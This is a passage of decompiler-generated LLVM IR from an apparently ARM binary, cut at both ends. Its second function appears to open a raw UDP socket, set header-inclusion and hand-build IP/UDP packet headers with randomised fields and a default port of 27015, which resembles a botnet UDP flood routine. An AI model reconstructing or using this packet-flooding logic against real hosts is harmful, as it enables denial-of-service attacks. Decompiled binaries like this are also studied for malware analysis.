  %v5_9e90 = inttoptr i32 %v4_9e90 to i16*
  store i16 %v3_9e88, i16* %v5_9e90, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9e98 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e98 = trunc i32 %v0_9e98 to i16
  %v2_9e98 = load i32, i32* @r6, align 4
  %v3_9e98 = add i32 %v2_9e98, 10
  %v4_9e98 = inttoptr i32 %v3_9e98 to i16*
  store i16 %v1_9e98, i16* %v4_9e98, align 2
  %v0_9e9c = load i32, i32* @r6, align 4
  store i32 %v0_9e9c, i32* @r0, align 4
  %v2_9ea0 = call i32 @function_c848(i32 %v0_9e9c, i32 20)
  %v3_9ea0 = trunc i32 %v2_9ea0 to i16
  %v3_9ea4 = load i32, i32* @r6, align 4
  %v4_9ea4 = add i32 %v3_9ea4, 10
  %v5_9ea4 = inttoptr i32 %v4_9ea4 to i16*
  store i16 %v3_9ea0, i16* %v5_9ea4, align 2
  store i32 0, i32* @r4, align 4
  %v0_9eac = load i32, i32* @r7, align 4
  store i32 %v0_9eac, i32* @r1, align 4
  %v1_9eb0 = add i32 %v0_9eac, 4
  %v2_9eb0 = inttoptr i32 %v1_9eb0 to i16*
  %v3_9eb0 = load i16, i16* %v2_9eb0, align 2
  %v4_9eb0 = zext i16 %v3_9eb0 to i32
  store i32 %v4_9eb0, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_9eb8 = add i32 %v0_9eac, 6
  %v4_9eb8 = inttoptr i32 %v3_9eb8 to i16*
  store i16 0, i16* %v4_9eb8, align 2
  %v0_9ebc = load i32, i32* @r6, align 4
  %v4_9ec0 = call i32 @function_c898(i32 %v0_9ebc, i32 %v0_9eac, i32 %v4_9eb0, i32 %stack_var_-124.0.ph)
  %v5_9ec0 = trunc i32 %v4_9ec0 to i16
  %v3_9ec4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9ec4, i32* %r2.global-to-local, align 4
  %v3_9ec8 = mul i32 %v3_9ec4, 32
  store i32 %v3_9ec8, i32* %r3.global-to-local, align 4
  %v0_9ecc = load i32, i32* @r5, align 4
  %v1_9ecc = add i32 %v0_9ecc, 16
  %v2_9ecc = inttoptr i32 %v1_9ecc to i32*
  %v3_9ecc = load i32, i32* %v2_9ecc, align 4
  %v5_9ed0 = mul i32 %v3_9ec4, 24
  store i32 %v5_9ed0, i32* %r3.global-to-local, align 4
  %v1_9ed4 = load i32, i32* @sb, align 4
  %v2_9ed4 = add i32 %v1_9ed4, %v5_9ed0
  store i32 %v2_9ed4, i32* @lr, align 4
  %v2_9ed8 = add i32 %v2_9ed4, 4
  %v3_9ed8 = inttoptr i32 %v2_9ed8 to i32*
  store i32 %v3_9ecc, i32* %v3_9ed8, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9ee0 = load i32, i32* @r7, align 4
  %v4_9ee0 = add i32 %v3_9ee0, 6
  %v5_9ee0 = inttoptr i32 %v4_9ee0 to i16*
  store i16 %v5_9ec0, i16* %v5_9ee0, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9ee8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9ee8 = trunc i32 %v0_9ee8 to i16
  %v2_9ee8 = load i32, i32* %r3.global-to-local, align 4
  %v3_9ee8 = load i32, i32* @sb, align 4
  %v4_9ee8 = add i32 %v3_9ee8, %v2_9ee8
  %v5_9ee8 = inttoptr i32 %v4_9ee8 to i16*
  store i16 %v1_9ee8, i16* %v5_9ee8, align 2
  %v0_9eec = load i32, i32* @r4, align 4
  %v1_9eec = trunc i32 %v0_9eec to i16
  %v2_9eec = load i32, i32* @lr, align 4
  %v3_9eec = add i32 %v2_9eec, 2
  %v4_9eec = inttoptr i32 %v3_9eec to i16*
  store i16 %v1_9eec, i16* %v4_9eec, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9ef4 = load i32, i32* @r5, align 4
  store i32 %v0_9ef4, i32* %r1.global-to-local, align 4
  %v0_9efc = load i32, i32* @r8, align 4
  store i32 %v0_9efc, i32* %r2.global-to-local, align 4
  %v0_9f00 = load i32, i32* @lr, align 4
  %v0_9f04 = load i32, i32* %ip.global-to-local, align 4
  %v6_9f08 = call i32 @function_11338(i32 %v3_9b7c, i32 %v0_9ef4, i32 %v0_9efc, i32 16384, i32 %v0_9f00, i32 %v0_9f04)
  %v3_9f0c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9f0c, i32* %r3.global-to-local, align 4
  %v1_9f10 = add i32 %v3_9f0c, 1
  %v1_9f14 = load i32, i32* @sl, align 4
  %v9_9f14 = icmp eq i32 %v1_9f10, %v1_9f14
  store i1 %v9_9f14, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9f10, i32* %stack_var_-44, align 4
  %v6_9f1c = icmp slt i32 %v1_9f10, %v1_9f14
  br i1 %v6_9f1c, label %dec_label_pc_9dfc, label %dec_label_pc_9de8

dec_label_pc_9f24:                                ; preds = %dec_label_pc_9dfc
  %v1_9f24 = add i32 %v2_9e04, 16
  %v2_9f24 = inttoptr i32 %v1_9f24 to i32*
  %v3_9f24 = load i32, i32* %v2_9f24, align 4
  store i32 %v3_9f24, i32* %r4.global-to-local, align 4
  %v0_9f28 = call i32 @function_e094()
  %v3_9f2c = load i32, i32* %stack_var_-44, align 4
  %v5_9f34 = mul i32 %v3_9f2c, 24
  %v0_9f38 = load i32, i32* %r4.global-to-local, align 4
  %v1_9f38 = and i32 %v0_9f38, 16711680
  store i32 %v1_9f38, i32* %ip.global-to-local, align 4
  %v3_9f3c = udiv i32 %v0_9f38, 16777216
  %v4_9f40 = udiv i32 %v1_9f38, 256
  %v5_9f40 = or i32 %v4_9f40, %v3_9f3c
  store i32 %v5_9f40, i32* %r2.global-to-local, align 4
  %v1_9f44 = load i32, i32* @sb, align 4
  %v2_9f44 = add i32 %v1_9f44, %v5_9f34
  store i32 %v2_9f44, i32* %r1.global-to-local, align 4
  %v1_9f48 = and i32 %v0_9f38, 65280
  store i32 %v1_9f48, i32* %r3.global-to-local, align 4
  %v1_9f4c = add i32 %v2_9f44, 20
  %v2_9f4c = inttoptr i32 %v1_9f4c to i8*
  %v3_9f4c = load i8, i8* %v2_9f4c, align 1
  %v4_9f4c = zext i8 %v3_9f4c to i32
  store i32 %v4_9f4c, i32* %ip.global-to-local, align 4
  %v5_9f54 = call i32 @llvm.bswap.i32(i32 %v0_9f38)
  %v7_9f58 = lshr i32 %v0_9f28, %v4_9f4c
  %v8_9f58 = add i32 %v7_9f58, %v5_9f54
  store i32 %v8_9f58, i32* %r2.global-to-local, align 4
  store i32 %v5_9b68, i32* %r1.global-to-local, align 4
  %v5_9f74 = call i32 @llvm.bswap.i32(i32 %v8_9f58)
  store i32 %v5_9f74, i32* %r3.global-to-local, align 4
  store i1 %v7_9e28, i1* %cpsr_z.global-to-local, align 1
  %v1_9f7c = load i32, i32* @r5, align 4
  %v2_9f7c = add i32 %v1_9f7c, 16
  %v3_9f7c = inttoptr i32 %v2_9f7c to i32*
  store i32 %v5_9f74, i32* %v3_9f7c, align 4
  br i1 %v2_9e28, label %dec_label_pc_9f84, label %dec_label_pc_9e30

dec_label_pc_9f84:                                ; preds = %dec_label_pc_9f24, %dec_label_pc_9e24
  %v0_9f84 = call i32 @function_e094()
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9f90 = load i32, i32* @fp, align 4
  %v9_9f90 = icmp eq i32 %v0_9f90, 65535
  store i1 %v9_9f90, i1* %cpsr_z.global-to-local, align 1
  %v1_9f94 = load i32, i32* @r5, align 4
  %v2_9f94 = add i32 %v1_9f94, 12
  %v3_9f94 = inttoptr i32 %v2_9f94 to i32*
  store i32 %v0_9f84, i32* %v3_9f94, align 4
  br i1 %v9_9f90, label %dec_label_pc_9f9c, label %dec_label_pc_9f84.dec_label_pc_9e40_crit_edge

dec_label_pc_9f84.dec_label_pc_9e40_crit_edge:    ; preds = %dec_label_pc_9f84
  %v1_9e44.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9e40

dec_label_pc_9f9c:                                ; preds = %dec_label_pc_9f84, %dec_label_pc_9e30
  %v0_9f9c = call i32 @function_e094()
  %v3_9fa4 = urem i32 %v0_9f9c, 65536
  store i32 %v3_9bc8, i32* %r2.global-to-local, align 4
  %v1_9fb0 = sub nsw i32 999, %v3_9fa4
  store i32 %v1_9fb0, i32* %r3.global-to-local, align 4
  %v1_9fb4 = load i32, i32* %r4.global-to-local, align 4
  %v9_9fb4 = icmp eq i32 %v3_9bc8, %v1_9fb4
  store i1 %v9_9fb4, i1* %cpsr_z.global-to-local, align 1
  %v1_9fb8 = trunc i32 %v0_9f9c to i16
  %v2_9fb8 = load i32, i32* @r5, align 4
  %v3_9fb8 = add i32 %v2_9fb8, 4
  %v4_9fb8 = inttoptr i32 %v3_9fb8 to i16*
  store i16 %v1_9fb8, i16* %v4_9fb8, align 2
  %v0_9fbc = load i32, i32* %r3.global-to-local, align 4
  %v1_9fbc = trunc i32 %v0_9fbc to i16
  %v2_9fbc = load i32, i32* @r6, align 4
  %v3_9fbc = add i32 %v2_9fbc, 4
  %v4_9fbc = inttoptr i32 %v3_9fbc to i16*
  store i16 %v1_9fbc, i16* %v4_9fbc, align 2
  br i1 %v9_9fb4, label %dec_label_pc_9fc4, label %dec_label_pc_9f9c.dec_label_pc_9e4c_crit_edge

dec_label_pc_9f9c.dec_label_pc_9e4c_crit_edge:    ; preds = %dec_label_pc_9f9c
  %v1_9e50.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9e4c

dec_label_pc_9fc4:                                ; preds = %dec_label_pc_9f9c, %dec_label_pc_9e40
  %v0_9fc4 = call i32 @function_e094()
  %v1_9fc4 = trunc i32 %v0_9fc4 to i16
  store i32 %v3_9bcc, i32* %r3.global-to-local, align 4
  %v1_9fcc = load i32, i32* %r4.global-to-local, align 4
  %v9_9fcc = icmp eq i32 %v3_9bcc, %v1_9fcc
  store i1 %v9_9fcc, i1* %cpsr_z.global-to-local, align 1
  %v3_9fd0 = load i32, i32* @r5, align 4
  %v4_9fd0 = add i32 %v3_9fd0, 44
  %v5_9fd0 = inttoptr i32 %v4_9fd0 to i16*
  store i16 %v1_9fc4, i16* %v5_9fd0, align 2
  br i1 %v9_9fcc, label %dec_label_pc_9fd8, label %dec_label_pc_9e58

dec_label_pc_9fd8:                                ; preds = %dec_label_pc_9fc4, %dec_label_pc_9e4c
  %v0_9fd8 = call i32 @function_e094()
  %v1_9fd8 = trunc i32 %v0_9fd8 to i16
  store i32 %v1_9bc0, i32* @r4, align 4
  store i1 %v2_9fe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9fe0, label %.thread30, label %bb85

.thread30:                                        ; preds = %dec_label_pc_9fd8
  %v3_9fe831 = load i32, i32* @r7, align 4
  %v4_9fe832 = add i32 %v3_9fe831, 2
  %v5_9fe833 = inttoptr i32 %v4_9fe832 to i16*
  store i16 %v1_9fd8, i16* %v5_9fe833, align 2
  br label %dec_label_pc_9ff4

bb85:                                             ; preds = %dec_label_pc_9fd8
  %v1_9fe4 = load i32, i32* @r5, align 4
  %v2_9fe4 = add i32 %v1_9fe4, 16
  %v3_9fe4 = inttoptr i32 %v2_9fe4 to i32*
  %v4_9fe4 = load i32, i32* %v3_9fe4, align 4
  store i32 %v4_9fe4, i32* %r3.global-to-local, align 4
  %v3_9fe8 = load i32, i32* @r7, align 4
  %v4_9fe8 = add i32 %v3_9fe8, 2
  %v5_9fe8 = inttoptr i32 %v4_9fe8 to i16*
  store i16 %v1_9fd8, i16* %v5_9fe8, align 2
  %v1_9fec = load i32, i32* %r3.global-to-local, align 4
  %v2_9fec = load i32, i32* @r6, align 4
  %v3_9fec = add i32 %v2_9fec, 16
  %v4_9fec = inttoptr i32 %v3_9fec to i32*
  store i32 %v1_9fec, i32* %v4_9fec, align 4
  br label %dec_label_pc_9e6c

dec_label_pc_9ff4:                                ; preds = %.thread30, %dec_label_pc_9e58
  %v0_9ff4 = call i32 @function_e094()
  store i32 %v1_9b34, i32* %r1.global-to-local, align 4
  store i1 %v2_9ffc, i1* %cpsr_z.global-to-local, align 1
  %v1_a000 = load i32, i32* @r6, align 4
  %v2_a000 = add i32 %v1_a000, 16
  %v3_a000 = inttoptr i32 %v2_a000 to i32*
  store i32 %v0_9ff4, i32* %v3_a000, align 4
  br i1 %v2_9ffc, label %dec_label_pc_9e78, label %dec_label_pc_a008

dec_label_pc_a008:                                ; preds = %dec_label_pc_9e6c, %dec_label_pc_9ff4
  %v0_a008 = load i32, i32* @r7, align 4
  %v1_a008 = add i32 %v0_a008, 8
  store i32 %v5_9b14, i32* %r1.global-to-local, align 4
  %v2_a010 = inttoptr i32 %v1_a008 to i16*
  %v3_a010 = call i32 @function_e228(i16* %v2_a010, i32 %v5_9b14)
  br label %dec_label_pc_9e78

dec_label_pc_a018:                                ; preds = %dec_label_pc_9b8c
  %v1_a01c = call i32 @function_10be0(i32 %v3_9b7c)
  br label %dec_label_pc_a020

dec_label_pc_a020:                                ; preds = %dec_label_pc_9a2c, %dec_label_pc_a018
  %v1_a028 = phi i32 [ %v3_9b7c, %dec_label_pc_9a2c ], [ %v1_a01c, %dec_label_pc_a018 ]
  store i32 %v3_9a2c, i32* %r4.global-to-local, align 4
  store i32 %v6_9a2c, i32* %r5.global-to-local, align 4
  store i32 %v24_9a2c, i32* %fp.global-to-local, align 4
  ret i32 %v1_a028

dec_label_pc_a02c:                                ; preds = %dec_label_pc_9bb4
  store i32 %v5_9b14, i32* %r2.global-to-local, align 4
  %v1_a034 = add i32 %v5_9b14, 8
  store i32 %v1_a034, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9de8.preheader

; uselistorder directives
  uselistorder i32 %v1_a034, { 1, 0 }
  uselistorder i16 %v1_9fd8, { 1, 0 }
  uselistorder i32 %v0_9f9c, { 1, 0 }
  uselistorder i32 %v5_9f74, { 1, 0 }
  uselistorder i32 %v0_9f38, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9f14, { 1, 2, 0 }
  uselistorder i32 %v1_9f10, { 2, 0, 3, 1 }
  uselistorder i32 %v3_9ec4, { 1, 0, 2 }
  uselistorder i32 %v0_9eac, { 1, 0, 2, 3 }
  uselistorder i32 %v7_9e10, { 1, 0, 2 }
  uselistorder i1 %v7_9e28, { 2, 1, 0 }
  uselistorder i1 %v2_9ffc, { 2, 3, 1, 0 }
  uselistorder i1 %v2_9fe0, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9d84, { 1, 0 }
  uselistorder i32 %v4_9cf813, { 1, 0 }
  uselistorder i32 %v3_9c1c, { 1, 0 }
  uselistorder i32 %v3_9c00, { 1, 2, 0 }
  uselistorder i32 %v1_9bfc, { 1, 0 }
  uselistorder i32 %v1_9bc0, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9bbc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_9bb8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9bb4, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9bac, { 1, 0 }
  uselistorder i1 %v7_9b80, { 1, 0 }
  uselistorder i32 %v3_9b7c, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v5_9b68, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_9b34, { 2, 1, 3, 0 }
  uselistorder i32 %v5_9b14, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_9ac8, { 1, 0 }
  uselistorder i32 %v1_9aa4, { 2, 1, 0 }
  uselistorder i32 %v5_9a9c, { 1, 0 }
  uselistorder i8 %v5_9a80, { 0, 2, 1 }
  uselistorder i32 %v6_9a60, { 1, 0 }
  uselistorder i32 %v2_9a48, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 7, 6, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 26, 25, 27, 28, 30, 29, 31, 32, 34, 33, 36, 35, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a020, { 1, 0 }
  uselistorder label %dec_label_pc_a008, { 1, 0 }
  uselistorder label %dec_label_pc_9e78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9de8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9de8.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @function_a048(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a048:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_a048 = load i32, i32* @r4, align 4
  %v27_a048 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_a064 = call i32 @function_11f24(i32 %arg1, i32 4)
  %v0_a068 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a064, i32* @fp, align 4
  %v0_a078 = load i32, i32* @r4, align 4
  %v4_a07c = inttoptr i32 %v0_a068 to i32*
  %v5_a07c = call i32 @function_8570(i32 %v0_a078, i32* %v4_a07c, i32 2, i32 0)
  %v1_a088 = urem i32 %v5_a07c, 256
  store i32 %v1_a088, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a094 = load i32, i32* @r4, align 4
  %v0_a098 = load i32, i32* @r5, align 4
  %v5_a09c = trunc i32 %v5_a07c to i8
  %v6_a0a0 = inttoptr i32 %v0_a098 to i32*
  %v7_a0a0 = call i32 @function_8570(i32 %v0_a094, i32* %v6_a0a0, i32 3, i32 65535)
  %v0_a0a4 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a0a0, i32* @r7, align 4
  %v0_a0b4 = load i32, i32* @r4, align 4
  %v4_a0b8 = inttoptr i32 %v0_a0a4 to i32*
  %v5_a0b8 = call i32 @function_8570(i32 %v0_a0b4, i32* %v4_a0b8, i32 4, i32 64)
  %v1_a0c0 = urem i32 %v5_a0b8, 256
  store i32 %v1_a0c0, i32* %ip.global-to-local, align 4
  %v0_a0c4 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a0d0 = load i32, i32* @r4, align 4
  %v6_a0d8 = inttoptr i32 %v0_a0c4 to i32*
  %v7_a0d8 = call i32 @function_8570(i32 %v0_a0d0, i32* %v6_a0d8, i32 5, i32 0)
  %v1_a0e4 = urem i32 %v7_a0d8, 256
  store i32 %v1_a0e4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a0f0 = load i32, i32* @r4, align 4
  %v0_a0f4 = load i32, i32* @r5, align 4
  %v5_a0fc = inttoptr i32 %v0_a0f4 to i32*
  %v6_a0fc = call i32 @function_8570(i32 %v0_a0f0, i32* %v5_a0fc, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a10c = load i32, i32* @r5, align 4
  store i32 %v6_a0fc, i32* @r6, align 4
  %v0_a114 = load i32, i32* @r4, align 4
  %v4_a118 = inttoptr i32 %v0_a10c to i32*
  %v5_a118 = call i32 @function_8570(i32 %v0_a114, i32* %v4_a118, i32 7, i32 27015)
  store i32 %v5_a118, i32* @r4, align 4
  %v1_a124 = call i32 @function_fd40(i32 20)
  %v3_a130 = call i32 @function_fc7c(i32 20, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_a144 = call i32 @function_113bc(i32 2, i32 3, i32 17)
  %v7_a148 = icmp eq i32 %v3_a144, -1
  store i1 %v7_a148, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a144, i32* @sb, align 4
  br i1 %v7_a148, label %dec_label_pc_a470, label %dec_label_pc_a154

dec_label_pc_a154:                                ; preds = %dec_label_pc_a048
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a15c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a15c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a170 = call i32 @function_11378(i32 %v3_a144, i32 0, i32 3, i32 %v6_a15c, i32 ptrtoint (i32* @0 to i32))
  %v7_a174 = icmp eq i32 %v5_a170, -1
  store i1 %v7_a174, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a174, label %dec_label_pc_a468, label %dec_label_pc_a17c

dec_label_pc_a17c:                                ; preds = %dec_label_pc_a154
  %v0_a17c = load i32, i32* @r4, align 4
  %v3_a17c = mul i32 %v0_a17c, 65536
  store i32 %v3_a17c, i32* @lr, align 4
  %v0_a180 = load i32, i32* @r7, align 4
  %v0_a184 = load i32, i32* @r6, align 4
  %v3_a184 = mul i32 %v0_a184, 65536
  store i32 %v3_a184, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_a18c = urem i32 %v0_a180, 65536
  %v3_a190 = urem i32 %v0_a184, 65536
  store i32 %v3_a190, i32* %r2.global-to-local, align 4
  %v3_a194 = urem i32 %v0_a17c, 65536
  store i32 %v3_a194, i32* %r3.global-to-local, align 4
  %v0_a198 = load i32, i32* @r8, align 4
  %v2_a198 = icmp eq i32 %v0_a198, 0
  store i1 %v2_a198, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a198, label %dec_label_pc_a2d4.preheader, label %dec_label_pc_a1b0

dec_label_pc_a1b0:                                ; preds = %dec_label_pc_a17c
  %tmp34 = mul i32 %v0_a180, 256
  %v3_a1c0 = and i32 %tmp34, 65280
  store i32 %v3_a1c0, i32* %r3.global-to-local, align 4
  %tmp35 = mul i32 %v0_a184, 256
  %v3_a1c4 = and i32 %tmp35, 65280
  store i32 %v3_a1c4, i32* %r2.global-to-local, align 4
  %tmp36 = mul i32 %v0_a17c, 256
  %v3_a1c8 = and i32 %tmp36, 65280
  %tmp37 = udiv i32 %v0_a180, 256
  %v4_a1cc = urem i32 %tmp37, 256
  %v5_a1cc = or i32 %v4_a1cc, %v3_a1c0
  store i32 %v5_a1cc, i32* @r5, align 4
  %tmp38 = udiv i32 %v0_a184, 256
  %v4_a1d0 = urem i32 %tmp38, 256
  %v5_a1d0 = or i32 %v4_a1d0, %v3_a1c4
  store i32 %v5_a1d0, i32* @r6, align 4
  %tmp39 = udiv i32 %v0_a17c, 256
  %v4_a1d4 = urem i32 %tmp39, 256
  %v5_a1d4 = or i32 %v4_a1d4, %v3_a1c8
  store i32 %v5_a1d4, i32* @r7, align 4
  %v1_a25c = trunc i32 %v5_a0b8 to i8
  br label %dec_label_pc_a1d8

dec_label_pc_a1d8:                                ; preds = %.thread, %dec_label_pc_a1b0
  %v2_a1e0 = call i32 @function_11f24(i32 128, i32 1)
  %v3_a1e4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a1e4, i32* %r2.global-to-local, align 4
  %v5_a1ec = mul i32 %v3_a1e4, 24
  store i32 %v5_a1ec, i32* %r3.global-to-local, align 4
  %v1_a1f0 = load i32, i32* @fp, align 4
  %v2_a1f0 = load i32, i32* @r4, align 4
  %v5_a1f0 = mul i32 %v2_a1f0, 4
  %v6_a1f0 = add i32 %v5_a1f0, %v1_a1f0
  %v7_a1f0 = inttoptr i32 %v6_a1f0 to i32*
  store i32 %v2_a1e0, i32* %v7_a1f0, align 4
  %v0_a1f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a1f4 = load i32, i32* @sl, align 4
  %v2_a1f4 = add i32 %v1_a1f4, %v0_a1f4
  store i32 %v2_a1f4, i32* %r3.global-to-local, align 4
  %v0_a1f8 = load i32, i32* @fp, align 4
  %v1_a1f8 = load i32, i32* %r2.global-to-local, align 4
  %v4_a1f8 = mul i32 %v1_a1f8, 4
  %v5_a1f8 = add i32 %v4_a1f8, %v0_a1f8
  %v6_a1f8 = inttoptr i32 %v5_a1f8 to i32*
  %v7_a1f8 = load i32, i32* %v6_a1f8, align 4
  store i32 %v7_a1f8, i32* @lr, align 4
  %v1_a200 = inttoptr i32 %v7_a1f8 to i8*
  %v2_a200 = load i8, i8* %v1_a200, align 1
  %tmp = urem i8 %v2_a200, 16
  %v1_a204 = zext i8 %tmp to i32
  %v1_a208 = or i32 %v1_a204, 64
  store i32 %v1_a208, i32* %r3.global-to-local, align 4
  %v1_a210 = trunc i32 %v1_a208 to i8
  store i8 %v1_a210, i8* %v1_a200, align 1
  %v0_a214 = load i32, i32* @lr, align 4
  %v1_a214 = inttoptr i32 %v0_a214 to i8*
  %v2_a214 = load i8, i8* %v1_a214, align 1
  %v1_a218 = and i8 %v2_a214, -16
  %v1_a21c = or i8 %v1_a218, 5
  store i8 %v1_a21c, i8* %v1_a214, align 1
  %v2_a228 = load i32, i32* @lr, align 4
  %v3_a228 = add i32 %v2_a228, 1
  %v4_a228 = inttoptr i32 %v3_a228 to i8*
  store i8 %v5_a09c, i8* %v4_a228, align 1
  %v3_a22c = load i32, i32* %stack_var_-48, align 4
  %v3_a230 = mul i32 %v3_a22c, 65536
  %v1_a234 = add i32 %v3_a230, 2097152
  %v3_a238 = udiv i32 %v1_a234, 256
  %v4_a240 = udiv i32 %v1_a234, 16777216
  %v5_a240 = or i32 %v3_a238, %v4_a240
  %v3_a244 = urem i32 %v3_a22c, 65536
  store i32 %v3_a244, i32* %r2.global-to-local, align 4
  %v1_a248 = trunc i32 %v5_a240 to i16
  %v2_a248 = load i32, i32* @lr, align 4
  %v3_a248 = add i32 %v2_a248, 2
  %v4_a248 = inttoptr i32 %v3_a248 to i16*
  store i16 %v1_a248, i16* %v4_a248, align 2
  %v0_a24c = load i32, i32* %r2.global-to-local, align 4
  %v1_a24c = mul i32 %v0_a24c, 65536
  %v3_a254 = add i32 %v1_a24c, 786432
  store i32 %v3_a254, i32* %r2.global-to-local, align 4
  store i32 %v1_a0e4, i32* %ip.global-to-local, align 4
  %v2_a25c = load i32, i32* @lr, align 4
  %v3_a25c = add i32 %v2_a25c, 8
  %v4_a25c = inttoptr i32 %v3_a25c to i8*
  store i8 %v1_a25c, i8* %v4_a25c, align 1
  %v0_a260 = load i32, i32* %r2.global-to-local, align 4
  %v3_a260 = udiv i32 %v0_a260, 256
  %v1_a264 = and i32 %v3_a260, 65280
  %v0_a268 = load i32, i32* %ip.global-to-local, align 4
  %v2_a268 = icmp eq i32 %v0_a268, 0
  store i1 %v2_a268, i1* %cpsr_z.global-to-local, align 1
  %v4_a26c = udiv i32 %v0_a260, 16777216
  %v5_a26c = or i32 %v1_a264, %v4_a26c
  store i32 %v5_a26c, i32* %ip.global-to-local, align 4
  %v2_a274 = load i32, i32* @lr, align 4
  %v3_a274 = add i32 %v2_a274, 9
  %v4_a274 = inttoptr i32 %v3_a274 to i8*
  store i8 17, i8* %v4_a274, align 1
  store i32 ptrtoint (i32* @global_var_20780.45 to i32), i32* %r3.global-to-local, align 4
  %v0_a27c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a27c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a1d8
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_a280 = load i32, i32* @lr, align 4
  %v4_a280 = add i32 %v3_a280, 6
  %v5_a280 = inttoptr i32 %v4_a280 to i16*
  store i16 64, i16* %v5_a280, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a1d8, %bb
  %v2_a284 = load i32, i32* @global_var_20780.45, align 4
  %v1_a288 = load i32, i32* @lr, align 4
  %v2_a288 = add i32 %v1_a288, 12
  %v3_a288 = inttoptr i32 %v2_a288 to i32*
  store i32 %v2_a284, i32* %v3_a288, align 4
  store i32 %v2_a1f4, i32* %r2.global-to-local, align 4
